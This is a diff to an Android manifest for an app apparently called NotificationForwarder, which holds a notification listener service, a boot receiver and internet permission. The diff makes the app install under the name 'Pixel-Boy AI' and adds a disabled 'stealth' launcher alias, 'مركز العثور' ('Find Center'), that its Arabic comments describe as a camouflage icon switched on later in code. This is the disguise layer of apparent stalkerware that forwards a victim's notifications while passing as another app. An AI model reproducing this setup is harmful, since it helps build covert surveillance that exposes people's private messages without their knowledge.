@@ -4,38 +4,53 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- هنا الإعدادات الأساسية التي يقرأها ملف الـ APK عند التثبيت -->
     <application
         android:name=".NotificationForwarderApp"
         android:allowBackup="true"
-        android:icon="@drawable/ic_find_center"
-        android:roundIcon="@drawable/ic_find_center"
-        android:label="مركز العثور"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:label="Pixel-Boy AI"
         android:networkSecurityConfig="@xml/network_security_config"
         android:supportsRtl="true"
         android:theme="@style/Theme.NotificationForwarder">
 
-        <!-- الشاشة الرئيسية (بدون LAUNCHER مباشر لإتاحة الإخفاء البرمجي) -->
+        <!-- النشاط الرئيسي -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleTask">
         </activity>
 
-        <!-- الأيقونة التمويهية التي تظهر على الشاشة الرئيسية باسم Pixel-Boy AI وتختفي برمجةً -->
+        <!-- 1. الأيقونة والاسم الأصلي (مفعل افتراضياً عند التثبيت) -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
+            android:enabled="true"
             android:exported="true"
             android:icon="@mipmap/ic_launcher"
             android:label="Pixel-Boy AI">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
-        <!-- خدمة التقاط وتوجيه الإشعارات -->
+        <!-- 2. الأيقونة والاسم التمويهي (معطل افتراضياً ويتم تفعيله لاحقاً برمجياً) -->
+        <activity-alias
+            android:name=".StealthAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_find_center"
+            android:label="مركز العثور">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- الخدمات والمستقبلات كما هي -->
         <service
             android:name=".service.AppNotificationListenerService"
             android:exported="true"
@@ -46,7 +61,6 @@
             </intent-filter>
         </service>
 
-        <!-- مستقبل إعادة التشغيل عند إقلاع الجهاز -->
         <receiver
             android:name=".receiver.BootCompletedReceiver"
             android:enabled="true"
